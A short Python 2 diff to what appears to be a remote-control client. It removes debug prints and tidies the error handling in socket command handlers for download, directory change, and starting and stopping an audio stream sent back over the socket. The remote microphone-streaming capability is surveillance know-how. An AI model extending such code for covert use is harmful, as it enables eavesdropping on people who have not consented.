@@ -250,17 +250,15 @@ class childSocket(threading.Thread):
                     except:
                         stdoutput = 'downloadError'
                 elif data.startswith('startAudio'):
-                    print 'init audio thread'
                     audioThread = audioStreaming(self.socket)
                     audioThread.start()
                     stdoutput = 'audioStarted'
                 elif data.startswith('stopAudio'):
-                    if audioThread:
+                    try:
                         audioThread.active = False
-                        stdoutput = 'audioStopped'
-                    else:
-                        stdoutput = 'audioStoppedError'
-                    print stdoutput
+                    except AttributeError:
+                        pass
+                    stdoutput = 'audioStopped'
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
@@ -320,7 +318,6 @@ class audioStreaming(threading.Thread):
                 self.active = False
                 break
 
-        print 'terminating'
         self.stream.close()
         self.p.terminate()
 
